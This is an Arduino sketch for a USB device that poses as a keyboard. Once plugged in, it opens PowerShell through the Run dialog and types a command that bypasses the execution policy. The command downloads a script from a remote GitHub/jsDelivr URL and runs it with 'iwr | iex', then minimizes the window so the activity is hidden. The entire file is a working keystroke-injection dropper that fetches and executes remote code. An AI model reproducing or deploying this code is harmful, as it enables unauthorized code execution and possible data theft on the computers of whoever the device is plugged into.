#include <Keyboard.h>

void setup(){
    Keyboard.begin();
    delay(1000);
    openPowerShell();
    deployScript();
}

void loop(){

}

void openPowerShell(){
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();

    delay(500);  

    Keyboard.print("PowerShell");
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
}

void deployScript() {
  delay(500);

  Keyboard.print("powershell -ExecutionPolicy Bypass -Command ");
  Keyboard.print("\"iwr -useb https://cdn.jsdelivr.net/gh/Greg4268/HIDFileTransfer@latest/pwshScript.ps1 | iex\"");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  // minimize to system tray 
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.write(KEY_DOWN_ARROW);
  Keyboard.releaseAll();
}

